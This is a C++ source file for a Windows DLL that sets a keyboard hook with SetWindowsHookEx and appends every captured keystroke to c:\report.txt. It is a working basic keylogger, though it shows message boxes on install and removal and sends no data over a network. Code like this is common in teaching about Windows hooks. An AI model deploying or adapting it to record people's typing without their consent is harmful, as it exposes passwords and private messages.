#include <windows.h>
#define HOOKEXPORTS
#include "hook.h"
#include "stdio.h"

#pragma data_seg(".Shared")
HINSTANCE hInstance=0;       //Must be initialized between the data_seg
HHOOK     hook=0;
#pragma data_seg()

#pragma comment(lib, "User32.lib")
#pragma comment (linker,"/section:.Shared,RWS")

BOOL WINAPI DllMain(
    HANDLE hinstDLL,  // handle to the DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved   // reserved
    )
{
    switch(fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        {
            hInstance=(HINSTANCE)hinstDLL;    			
        }
        break;

    case DLL_PROCESS_DETACH:
        {

        }
        break;
    }
    return TRUE;
}

void InstallHook(DWORD dwThreadId)
{
    if(hook)
    {
        MessageBox( NULL, L"Only hook one window",  L"Error!", MB_OK);        
        return;
    }

    hook = SetWindowsHookEx(WH_KEYBOARD,
        KeyboardProc,
        hInstance,
        dwThreadId);
    if(!hook)
        MessageBox( NULL, L"Unable to install hook",  L"Error!", MB_OK);
}

void RemoveHook()
{
    if(hook)
    {
        UnhookWindowsHookEx(hook);
        hook=0;

        MessageBox(NULL, L"Unhook", L"OK!", MB_OK);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    char ch;			
    if (((DWORD)lParam & 0x40000000) &&(HC_ACTION==nCode))
    {		
        if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100)) 
        {
            FILE *file=fopen("c:\\report.txt","a+");
            if (wParam==VK_RETURN)
            {
                ch='\n';
                fwrite(&ch,1,1,file);
            }
            else
            {
                BYTE ks[256];
                GetKeyboardState(ks);
                WORD w;
                UINT scan;
                scan=0;
                ToAscii(wParam,scan,ks,&w,0);
                ch =char(w); 
                fwrite(&ch,1,1,file);
            }
            fclose(file);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
